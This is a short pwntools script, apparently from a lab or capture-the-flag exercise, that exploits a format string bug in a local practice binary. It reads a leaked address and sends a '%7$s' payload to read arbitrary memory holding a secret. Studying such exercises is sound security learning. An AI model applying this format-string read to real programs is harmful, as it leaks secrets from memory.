#!/usr/bin/python3
# Name: fsb_aar.py

from pwn import *

p = process("./fsb_overwrite")

p.recvuntil(b"`secret`: ")
addr_secret = int(p.recvline()[:-1], 16)

fstring = b"%7$saaaa" # Length: 8
fstring += p64(addr_secret)

p.sendline(fstring)

p.interactive()